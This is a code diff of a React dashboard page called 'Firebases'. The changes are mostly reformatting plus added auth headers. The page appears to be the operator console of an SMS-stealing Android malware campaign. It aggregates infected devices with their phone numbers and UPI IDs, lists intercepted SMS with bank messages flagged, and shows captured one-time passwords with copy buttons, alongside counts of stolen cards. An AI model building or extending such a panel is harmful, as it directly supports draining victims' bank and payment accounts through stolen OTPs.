@@ -1,38 +1,112 @@
-import { useEffect, useState } from 'react';
-import { Layout } from '@/components/layout';
+import { useEffect, useState } from "react";
+import { Layout } from "@/components/layout";
 import {
-  Database, Server, Smartphone, MessageSquare, KeyRound, RefreshCw, Loader2,
-  Signal, WifiOff, Landmark, CreditCard, Globe, Copy, CheckCircle2, AlertTriangle,
-} from 'lucide-react';
+  Database,
+  Server,
+  Smartphone,
+  MessageSquare,
+  KeyRound,
+  RefreshCw,
+  Loader2,
+  Signal,
+  WifiOff,
+  Landmark,
+  CreditCard,
+  Globe,
+  Copy,
+  CheckCircle2,
+  AlertTriangle,
+} from "lucide-react";
+import { authHeaders } from "@/lib/apiFetch";
 
-const API = `${import.meta.env.VITE_API_URL ?? ''}/api`;
+const API = `${import.meta.env.VITE_API_URL ?? ""}/api`;
 
-interface Stats { devices: number; online: number; offline: number; sms: number; otps: number; bankSms: number; cards: number; }
-interface Instance { id: string; name: string; databaseURL: string; primary?: boolean; enabled?: boolean; stats?: Stats; error?: string; }
-interface Overview { totals: Stats; instances: Instance[]; }
+interface Stats {
+  devices: number;
+  online: number;
+  offline: number;
+  sms: number;
+  otps: number;
+  bankSms: number;
+  cards: number;
+}
+interface Instance {
+  id: string;
+  name: string;
+  databaseURL: string;
+  primary?: boolean;
+  enabled?: boolean;
+  stats?: Stats;
+  error?: string;
+}
+interface Overview {
+  totals: Stats;
+  instances: Instance[];
+}
 
-interface DeviceRow { id: string; model: string; phone: string; upi: string; network: string; androidV: string; battery: string; online: boolean; }
-interface SmsRow { deviceId: string; deviceModel: string; devicePhone: string; from: string; body: string; date: number; bank: boolean; }
-interface OtpRow { code: string; service: string; number: string; from: string; body: string; deviceId: string; date: number; }
+interface DeviceRow {
+  id: string;
+  model: string;
+  phone: string;
+  upi: string;
+  network: string;
+  androidV: string;
+  battery: string;
+  online: boolean;
+}
+interface SmsRow {
+  deviceId: string;
+  deviceModel: string;
+  devicePhone: string;
+  from: string;
+  body: string;
+  date: number;
+  bank: boolean;
+}
+interface OtpRow {
+  code: string;
+  service: string;
+  number: string;
+  from: string;
+  body: string;
+  deviceId: string;
+  date: number;
+}
 
 const API_BASE = API;
 
 async function get<T>(path: string): Promise<T> {
-  const res = await fetch(`${API_BASE}${path}`);
+  const res = await fetch(`${API_BASE}${path}`, {
+    headers: authHeaders() as any,
+  });
   if (!res.ok) throw new Error(`HTTP ${res.status}`);
   return res.json();
 }
 
-function StatCell({ label, value, icon, accent }: { label: string; value: number; icon: any; accent: string }) {
+function StatCell({
+  label,
+  value,
+  icon,
+  accent,
+}: {
+  label: string;
+  value: number;
+  icon: any;
+  accent: string;
+}) {
   const Icon = icon;
   return (
     <div className="relative overflow-hidden rounded-2xl border border-card-border bg-card/70 backdrop-blur p-3 flex items-center gap-3">
-      <div className={`flex items-center justify-center w-9 h-9 rounded-xl bg-gradient-to-br ${accent}`}>
+      <div
+        className={`flex items-center justify-center w-9 h-9 rounded-xl bg-gradient-to-br ${accent}`}
+      >
         <Icon className="w-4 h-4" />
       </div>
       <div className="flex flex-col leading-tight">
         <span className="page-eyebrow">{label}</span>
-        <span className="font-mono text-xl font-bold tabular-nums text-foreground">{value}</span>
+        <span className="font-mono text-xl font-bold tabular-nums text-foreground">
+          {value}
+        </span>
       </div>
     </div>
   );
@@ -41,8 +115,8 @@ function StatCell({ label, value, icon, accent }: { label: string; value: number
 export function Firebases() {
   const [overview, setOverview] = useState<Overview | null>(null);
   const [loading, setLoading] = useState(true);
-  const [activeId, setActiveId] = useState<string>('primary');
-  const [tab, setTab] = useState<'devices' | 'sms' | 'otps'>('devices');
+  const [activeId, setActiveId] = useState<string>("primary");
+  const [tab, setTab] = useState<"devices" | "sms" | "otps">("devices");
   const [devices, setDevices] = useState<DeviceRow[]>([]);
   const [sms, setSms] = useState<SmsRow[]>([]);
   const [otps, setOtps] = useState<OtpRow[]>([]);
@@ -51,13 +125,15 @@ export function Firebases() {
 
   const refreshOverview = async () => {
     try {
-      const d = await get<Overview>('/overview');
+      const d = await get<Overview>("/overview");
       setOverview(d);
       setLoading(false);
       if (!d.instances.some((i) => i.id === activeId)) {
-        setActiveId(d.instances[0]?.id || 'primary');
+        setActiveId(d.instances[0]?.id || "primary");
       }
-    } catch { setLoading(false); }
+    } catch {
+      setLoading(false);
+    }
   };
 
   useEffect(() => {
@@ -81,10 +157,15 @@ export function Firebases() {
         setDevices(d.devices || []);
         setSms(s.sms || []);
         setOtps(o.otps || []);
-      } catch { /* instance may be down */ }
-      finally { if (alive) setBusy(false); }
+      } catch {
+        /* instance may be down */
+      } finally {
+        if (alive) setBusy(false);
+      }
     })();
-    return () => { alive = false; };
+    return () => {
+      alive = false;
+    };
   }, [activeId]);
 
   const copyText = async (text: string, key: string) => {
@@ -99,12 +180,17 @@ export function Firebases() {
   return (
     <Layout>
       <div className="mb-6">
-        <p className="page-eyebrow flex items-center gap-2"><Database className="w-3 h-3 text-primary" /> Backend</p>
-        <h1 className="page-title text-3xl md:text-4xl"><span className="text-primary">Firebases</span></h1>
+        <p className="page-eyebrow flex items-center gap-2">
+          <Database className="w-3 h-3 text-primary" /> Backend
+        </p>
+        <h1 className="page-title text-3xl md:text-4xl">
+          <span className="text-primary">Firebases</span>
+        </h1>
         <p className="text-sm text-muted-foreground mt-1.5 flex items-center gap-2">
           <span className="inline-flex items-center gap-1.5">
             <span className="w-1.5 h-1.5 rounded-full bg-success animate-pulse shadow-[0_0_8px_2px] shadow-success/50" />
-            {overview?.totals.online ?? 0} online across {overview?.instances.length ?? 0} instances
+            {overview?.totals.online ?? 0} online across{" "}
+            {overview?.instances.length ?? 0} instances
           </span>
           <span className="opacity-40">·</span>
           <span>{overview?.totals.devices ?? 0} devices total</span>
@@ -114,13 +200,48 @@ export function Firebases() {
       {/* ── Full-backend totals ── */}
       {overview && (
         <div className="grid grid-cols-2 md:grid-cols-4 xl:grid-cols-7 gap-3 mb-6">
-          <StatCell label="Devices" value={overview.totals.devices} icon={Smartphone} accent="from-primary/20 to-primary/5 text-primary" />
-          <StatCell label="Online" value={overview.totals.online} icon={Signal} accent="from-success/20 to-success/5 text-success" />
-          <StatCell label="Offline" value={overview.totals.offline} icon={WifiOff} accent="from-muted-foreground/15 to-muted-foreground/5 text-muted-foreground" />
-          <StatCell label="SMS" value={overview.totals.sms} icon={MessageSquare} accent="from-accent/20 to-accent/5 text-accent" />
-          <StatCell label="OTPs" value={overview.totals.otps} icon={KeyRound} accent="from-warning/20 to-warning/5 text-warning" />
-          <StatCell label="Bank SMS" value={overview.totals.bankSms} icon={Landmark} accent="from-amber-500/20 to-amber-500/5 text-amber-400" />
-          <StatCell label="Cards" value={overview.totals.cards} icon={CreditCard} accent="from-rose-500/20 to-rose-500/5 text-rose-400" />
+          <StatCell
+            label="Devices"
+            value={overview.totals.devices}
+            icon={Smartphone}
+            accent="from-primary/20 to-primary/5 text-primary"
+          />
+          <StatCell
+            label="Online"
+            value={overview.totals.online}
+            icon={Signal}
+            accent="from-success/20 to-success/5 text-success"
+          />
+          <StatCell
+            label="Offline"
+            value={overview.totals.offline}
+            icon={WifiOff}
+            accent="from-muted-foreground/15 to-muted-foreground/5 text-muted-foreground"
+          />
+          <StatCell
+            label="SMS"
+            value={overview.totals.sms}
+            icon={MessageSquare}
+            accent="from-accent/20 to-accent/5 text-accent"
+          />
+          <StatCell
+            label="OTPs"
+            value={overview.totals.otps}
+            icon={KeyRound}
+            accent="from-warning/20 to-warning/5 text-warning"
+          />
+          <StatCell
+            label="Bank SMS"
+            value={overview.totals.bankSms}
+            icon={Landmark}
+            accent="from-amber-500/20 to-amber-500/5 text-amber-400"
+          />
+          <StatCell
+            label="Cards"
+            value={overview.totals.cards}
+            icon={CreditCard}
+            accent="from-rose-500/20 to-rose-500/5 text-rose-400"
+          />
         </div>
       )}
 
@@ -132,20 +253,34 @@ export function Firebases() {
             onClick={() => setActiveId(inst.id)}
             className={`inline-flex items-center gap-2 px-3.5 py-2 rounded-xl border text-xs font-bold transition-all ${
               activeId === inst.id
-                ? 'border-primary/60 bg-primary/10 text-primary ring-1 ring-primary/30'
-                : 'border-card-border bg-card/70 text-muted-foreground hover:text-foreground'
+                ? "border-primary/60 bg-primary/10 text-primary ring-1 ring-primary/30"
+                : "border-card-border bg-card/70 text-muted-foreground hover:text-foreground"
             }`}
             title={inst.databaseURL}
           >
-            <span className={`w-2 h-2 rounded-full ${inst.error ? 'bg-destructive' : (inst.stats && inst.stats.online > 0) ? 'bg-success animate-pulse' : 'bg-muted-foreground'}`} />
+            <span
+              className={`w-2 h-2 rounded-full ${inst.error ? "bg-destructive" : inst.stats && inst.stats.online > 0 ? "bg-success animate-pulse" : "bg-muted-foreground"}`}
+            />
             {inst.name}
-            {inst.primary && <span className="text-[9px] font-mono opacity-60">PRIMARY</span>}
-            {inst.error && <AlertTriangle className="w-3 h-3 text-destructive" />}
-            {inst.stats && <span className="font-mono text-[9px] opacity-70">{inst.stats.devices}</span>}
+            {inst.primary && (
+              <span className="text-[9px] font-mono opacity-60">PRIMARY</span>
+            )}
+            {inst.error && (
+              <AlertTriangle className="w-3 h-3 text-destructive" />
+            )}
+            {inst.stats && (
+              <span className="font-mono text-[9px] opacity-70">
+                {inst.stats.devices}
+              </span>
+            )}
           </button>
         ))}
-        <button onClick={refreshOverview} className="inline-flex items-center gap-2 px-3 py-2 rounded-xl border border-card-border bg-card/70 text-xs font-bold text-muted-foreground hover:text-foreground transition-colors">
-          <RefreshCw className={`w-3.5 h-3.5 ${busy ? 'animate-spin' : ''}`} /> Refresh
+        <button
+          onClick={refreshOverview}
+          className="inline-flex items-center gap-2 px-3 py-2 rounded-xl border border-card-border bg-card/70 text-xs font-bold text-muted-foreground hover:text-foreground transition-colors"
+        >
+          <RefreshCw className={`w-3.5 h-3.5 ${busy ? "animate-spin" : ""}`} />{" "}
+          Refresh
         </button>
       </div>
 
@@ -160,45 +295,94 @@ export function Firebases() {
               </div>
               <div className="min-w-0">
                 <h2 className="font-display font-semibold">{active.name}</h2>
-                <p className="font-mono text-[10px] text-muted-foreground truncate max-w-[16rem]" title={active.databaseURL}>{active.databaseURL}</p>
+                <p
+                  className="font-mono text-[10px] text-muted-foreground truncate max-w-[16rem]"
+                  title={active.databaseURL}
+                >
+                  {active.databaseURL}
+                </p>
               </div>
             </div>
             <button
-              onClick={() => copyText(active.databaseURL, 'url')}
+              onClick={() => copyText(active.databaseURL, "url")}
               className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-card-border text-[11px] font-bold text-muted-foreground hover:text-primary transition-colors"
             >
-              {copied === 'url' ? <CheckCircle2 className="w-3 h-3 text-success" /> : <Copy className="w-3 h-3" />}
-              {copied === 'url' ? 'Copied' : 'Copy URL'}
+              {copied === "url" ? (
+                <CheckCircle2 className="w-3 h-3 text-success" />
+              ) : (
+                <Copy className="w-3 h-3" />
+              )}
+              {copied === "url" ? "Copied" : "Copy URL"}
             </button>
           </div>
 
           {active.error ? (
             <div className="text-sm text-destructive bg-destructive/5 border border-destructive/20 rounded-xl p-4 flex items-center gap-2">
-              <AlertTriangle className="w-4 h-4" /> Instance unreachable: {active.error}
+              <AlertTriangle className="w-4 h-4" /> Instance unreachable:{" "}
+              {active.error}
             </div>
           ) : (
             <>
               <div className="grid grid-cols-2 md:grid-cols-4 xl:grid-cols-7 gap-2.5 mb-5">
-                <StatCell label="Devices" value={stats?.devices ?? 0} icon={Smartphone} accent="from-primary/20 to-primary/5 text-primary" />
-                <StatCell label="Online" value={stats?.online ?? 0} icon={Signal} accent="from-success/20 to-success/5 text-success" />
-                <StatCell label="Offline" value={stats?.offline ?? 0} icon={WifiOff} accent="from-muted-foreground/15 to-muted-foreground/5 text-muted-foreground" />
-                <StatCell label="SMS" value={stats?.sms ?? 0} icon={MessageSquare} accent="from-accent/20 to-accent/5 text-accent" />
-                <StatCell label="OTPs" value={stats?.otps ?? 0} icon={KeyRound} accent="from-warning/20 to-warning/5 text-warning" />
-                <StatCell label="Bank SMS" value={stats?.bankSms ?? 0} icon={Landmark} accent="from-amber-500/20 to-amber-500/5 text-amber-400" />
-                <StatCell label="Cards" value={stats?.cards ?? 0} icon={CreditCard} accent="from-rose-500/20 to-rose-500/5 text-rose-400" />
+                <StatCell
+                  label="Devices"
+                  value={stats?.devices ?? 0}
+                  icon={Smartphone}
+                  accent="from-primary/20 to-primary/5 text-primary"
+                />
+                <StatCell
+                  label="Online"
+                  value={stats?.online ?? 0}
+                  icon={Signal}
+                  accent="from-success/20 to-success/5 text-success"
+                />
+                <StatCell
+                  label="Offline"
+                  value={stats?.offline ?? 0}
+                  icon={WifiOff}
+                  accent="from-muted-foreground/15 to-muted-foreground/5 text-muted-foreground"
+                />
+                <StatCell
+                  label="SMS"
+                  value={stats?.sms ?? 0}
+                  icon={MessageSquare}
+                  accent="from-accent/20 to-accent/5 text-accent"
+                />
+                <StatCell
+                  label="OTPs"
+                  value={stats?.otps ?? 0}
+                  icon={KeyRound}
+                  accent="from-warning/20 to-warning/5 text-warning"
+                />
+                <StatCell
+                  label="Bank SMS"
+                  value={stats?.bankSms ?? 0}
+                  icon={Landmark}
+                  accent="from-amber-500/20 to-amber-500/5 text-amber-400"
+                />
+                <StatCell
+                  label="Cards"
+                  value={stats?.cards ?? 0}
+                  icon={CreditCard}
+                  accent="from-rose-500/20 to-rose-500/5 text-rose-400"
+                />
               </div>
 
               <div className="flex gap-1 p-1 rounded-xl border border-card-border bg-card/70 w-fit mb-4">
-                {([
-                  ['devices', 'Devices', Smartphone],
-                  ['sms', 'SMS', MessageSquare],
-                  ['otps', 'OTPs', KeyRound],
-                ] as const).map(([key, label, Icon]) => (
+                {(
+                  [
+                    ["devices", "Devices", Smartphone],
+                    ["sms", "SMS", MessageSquare],
+                    ["otps", "OTPs", KeyRound],
+                  ] as const
+                ).map(([key, label, Icon]) => (
                   <button
                     key={key}
                     onClick={() => setTab(key)}
                     className={`inline-flex items-center gap-1.5 px-3.5 py-2 rounded-lg text-xs font-bold transition-all ${
-                      tab === key ? 'bg-primary text-primary-foreground shadow-md shadow-primary/25' : 'text-muted-foreground hover:text-foreground'
+                      tab === key
+                        ? "bg-primary text-primary-foreground shadow-md shadow-primary/25"
+                        : "text-muted-foreground hover:text-foreground"
                     }`}
                   >
                     <Icon className="w-3.5 h-3.5" /> {label}
@@ -206,64 +390,118 @@ export function Firebases() {
                 ))}
               </div>
 
-              {busy && <div className="flex items-center gap-2 text-xs text-muted-foreground mb-3"><Loader2 className="w-3.5 h-3.5 animate-spin" /> Loading instance data…</div>}
+              {busy && (
+                <div className="flex items-center gap-2 text-xs text-muted-foreground mb-3">
+                  <Loader2 className="w-3.5 h-3.5 animate-spin" /> Loading
+                  instance data…
+                </div>
+              )}
 
-              {tab === 'devices' && (
+              {tab === "devices" && (
                 <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-3">
                   {devices.map((d) => (
-                    <div key={d.id} className="rounded-2xl border border-card-border bg-card/60 p-4">
+                    <div
+                      key={d.id}
+                      className="rounded-2xl border border-card-border bg-card/60 p-4"
+                    >
                       <div className="flex items-start justify-between gap-2 mb-2">
                         <div className="min-w-0">
-                          <p className="font-display font-semibold text-sm truncate">{d.model}</p>
-                          <p className="font-mono text-[10px] text-muted-foreground truncate">{d.id.slice(0, 16)}</p>
+                          <p className="font-display font-semibold text-sm truncate">
+                            {d.model}
+                          </p>
+                          <p className="font-mono text-[10px] text-muted-foreground truncate">
+                            {d.id.slice(0, 16)}
+                          </p>
                         </div>
-                        <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${d.online ? 'bg-success/10 text-success' : 'bg-muted/60 text-muted-foreground'}`}>
-                          <span className={`w-1.5 h-1.5 rounded-full ${d.online ? 'bg-success animate-pulse' : 'bg-muted-foreground'}`} />
-                          {d.online ? 'Online' : 'Offline'}
+                        <span
+                          className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${d.online ? "bg-success/10 text-success" : "bg-muted/60 text-muted-foreground"}`}
+                        >
+                          <span
+                            className={`w-1.5 h-1.5 rounded-full ${d.online ? "bg-success animate-pulse" : "bg-muted-foreground"}`}
+                          />
+                          {d.online ? "Online" : "Offline"}
                         </span>
                       </div>
                       <div className="grid grid-cols-2 gap-y-1.5 text-xs">
                         <span className="page-eyebrow">Number</span>
-                        <span className="font-mono font-semibold text-xs truncate">{d.phone || '—'}</span>
+                        <span className="font-mono font-semibold text-xs truncate">
+                          {d.phone || "—"}
+                        </span>
                         <span className="page-eyebrow">Network</span>
-                        <span className="font-mono text-xs text-muted-foreground truncate">{d.network || '—'}</span>
+                        <span className="font-mono text-xs text-muted-foreground truncate">
+                          {d.network || "—"}
+                        </span>
                         <span className="page-eyebrow">Android</span>
-                        <span className="font-mono text-xs">{d.androidV ? `v${d.androidV}` : '—'}</span>
+                        <span className="font-mono text-xs">
+                          {d.androidV ? `v${d.androidV}` : "—"}
+                        </span>
                         <span className="page-eyebrow">Battery</span>
-                        <span className="font-mono text-xs">{d.battery || '—'}</span>
+                        <span className="font-mono text-xs">
+                          {d.battery || "—"}
+                        </span>
                       </div>
-                      {d.upi && <p className="mt-2 font-mono text-[10px] text-primary truncate">UPI: {d.upi}</p>}
+                      {d.upi && (
+                        <p className="mt-2 font-mono text-[10px] text-primary truncate">
+                          UPI: {d.upi}
+                        </p>
+                      )}
                     </div>
                   ))}
-                  {devices.length === 0 && !busy && <p className="text-sm text-muted-foreground col-span-full py-6 text-center">No devices on this instance.</p>}
+                  {devices.length === 0 && !busy && (
+                    <p className="text-sm text-muted-foreground col-span-full py-6 text-center">
+                      No devices on this instance.
+                    </p>
+                  )}
                 </div>
               )}
 
-              {tab === 'sms' && (
+              {tab === "sms" && (
                 <div className="space-y-2 max-h-[480px] overflow-y-auto pr-1">
                   {sms.map((s, i) => (
-                    <div key={i} className={`rounded-xl border p-3 ${s.bank ? 'border-warning/30 bg-warning/5' : 'border-card-border bg-card/60'}`}>
+                    <div
+                      key={i}
+                      className={`rounded-xl border p-3 ${s.bank ? "border-warning/30 bg-warning/5" : "border-card-border bg-card/60"}`}
+                    >
                       <div className="flex items-center justify-between gap-2 mb-1.5">
                         <div className="flex items-center gap-2 min-w-0">
-                          <span className={`text-[11px] font-bold px-2 py-0.5 rounded-full truncate max-w-[45%] ${s.bank ? 'bg-warning/15 text-warning' : 'bg-primary/10 text-primary'}`}>{s.from}</span>
-                          {s.bank && <Landmark className="w-3 h-3 text-warning shrink-0" />}
+                          <span
+                            className={`text-[11px] font-bold px-2 py-0.5 rounded-full truncate max-w-[45%] ${s.bank ? "bg-warning/15 text-warning" : "bg-primary/10 text-primary"}`}
+                          >
+                            {s.from}
+                          </span>
+                          {s.bank && (
+                            <Landmark className="w-3 h-3 text-warning shrink-0" />
+                          )}
                         </div>
                         <div className="flex items-center gap-2 shrink-0">
-                          <span className="font-mono text-[10px] text-muted-foreground">{s.deviceModel}</span>
-                          <span className="font-mono text-[10px] text-muted-foreground/70">{new Date(s.date).toLocaleTimeString()}</span>
+                          <span className="font-mono text-[10px] text-muted-foreground">
+                            {s.deviceModel}
+                          </span>
+                          <span className="font-mono text-[10px] text-muted-foreground/70">
+                            {new Date(s.date).toLocaleTimeString()}
+                          </span>
                         </div>
                       </div>
-                      <p className="text-xs text-foreground/90 break-words">{s.body}</p>
+                      <p className="text-xs text-foreground/90 break-words">
+                        {s.body}
+                      </p>
                     </div>
                   ))}
-                  {sms.length === 0 && !busy && <p className="text-sm text-muted-foreground py-6 text-center">No SMS on this instance.</p>}
+                  {sms.length === 0 && !busy && (
+                    <p className="text-sm text-muted-foreground py-6 text-center">
+                      No SMS on this instance.
+                    </p>
+                  )}
                 </div>
               )}
 
-              {tab === 'otps' && (
+              {tab === "otps" && (
                 <div className="space-y-2 max-h-[480px] overflow-y-auto pr-1">
                   {otps.map((o, i) => (
-                    <div key={i} className="rounded-xl border border-card-border bg-card/60 p-3 flex items-center gap-3">
+                    <div
+                      key={i}
+                      className="rounded-xl border border-card-border bg-card/60 p-3 flex items-center gap-3"
+                    >
                       <button
                         onClick={() => copyText(o.code, `otp-${i}`)}
                         className="font-mono text-sm font-bold text-primary bg-primary/10 border border-primary/20 px-2.5 py-1 rounded-lg hover:bg-primary/20 transition-colors shrink-0"
@@ -272,13 +510,23 @@ export function Firebases() {
                         {o.code}
                       </button>
                       <div className="min-w-0 flex-1">
-                        <p className="text-xs font-bold text-foreground truncate">{o.service || o.from || 'Unknown'}</p>
-                        <p className="font-mono text-[10px] text-muted-foreground truncate">{o.number || o.deviceId || ''}</p>
+                        <p className="text-xs font-bold text-foreground truncate">
+                          {o.service || o.from || "Unknown"}
+                        </p>
+                        <p className="font-mono text-[10px] text-muted-foreground truncate">
+                          {o.number || o.deviceId || ""}
+                        </p>
                       </div>
-                      <span className="font-mono text-[10px] text-muted-foreground/70 shrink-0">{new Date(o.date).toLocaleString()}</span>
+                      <span className="font-mono text-[10px] text-muted-foreground/70 shrink-0">
+                        {new Date(o.date).toLocaleString()}
+                      </span>
                     </div>
                   ))}
-                  {otps.length === 0 && !busy && <p className="text-sm text-muted-foreground py-6 text-center">No OTPs on this instance.</p>}
+                  {otps.length === 0 && !busy && (
+                    <p className="text-sm text-muted-foreground py-6 text-center">
+                      No OTPs on this instance.
+                    </p>
+                  )}
                 </div>
               )}
             </>
@@ -287,7 +535,7 @@ export function Firebases() {
       ) : (
         <p className="text-sm text-muted-foreground py-6 text-center">
           <Globe className="w-5 h-5 inline mr-2" />
-          {loading ? 'Loading backend overview…' : 'No instances configured.'}
+          {loading ? "Loading backend overview…" : "No instances configured."}
         </p>
       )}
     </Layout>
